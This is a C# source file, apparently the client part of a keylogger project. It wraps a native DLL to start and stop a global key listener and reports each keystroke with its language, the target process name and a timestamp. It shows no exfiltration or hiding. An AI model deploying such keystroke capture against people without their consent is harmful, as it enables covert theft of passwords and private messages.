using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal class NativeKeyListener : IDisposable
{
    [DllImport("NKeyLoggerDLL", CallingConvention = CallingConvention.StdCall)]
    private static extern bool start(CallBackDelegate callBack);

    [DllImport("NKeyLoggerDLL", CallingConvention = CallingConvention.StdCall)]
    private static extern bool stop();

    [DllImport("NKeyLoggerDLL", CallingConvention = CallingConvention.StdCall)]
    private static extern void waitForStopped();

    private static bool isObjectExist = false;
    public NativeKeyListener()
    {
        if (isObjectExist)
            throw new ApplicationException("Native key listener already exists");
        isObjectExist = true;
    }

    ~NativeKeyListener()
    {
        Dispose();
    }

    private void takeKey(KeyResult key, bool isUpper)
    {
        if (isUpper)
            key.key = key.key.ToUpper();
        else
            key.key = key.key.ToLower();

        AbstractKeyInfo info = new KeyInfo(key.key, key.langName, key.procName, DateTime.Now.ToString("G"));
        onKeyDown?.Invoke(info);
    }
    public void Dispose()
    {
        stopListenAsync().Wait();
        isObjectExist = false;
    }
    public async Task<bool> listenAsync()
    {
        return await Task.Run(() =>
        {
            return start(takeKey);
        });
    }

    public async Task stopListenAsync()
    {
        stop();
        await Task.Run(() => waitForStopped());
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct KeyResult(string key, string langName, string procName, string error, bool isUpper)
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x10)] 
        public string key = key;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x100)]
        public string langName = langName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x400)]
        public string procName = procName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x400)]
        public string error = error;
    }

    private delegate void CallBackDelegate(KeyResult key, bool isUpper);
    public delegate void KeyEvent(AbstractKeyInfo keyInfo);
    public event KeyEvent? onKeyDown;
}
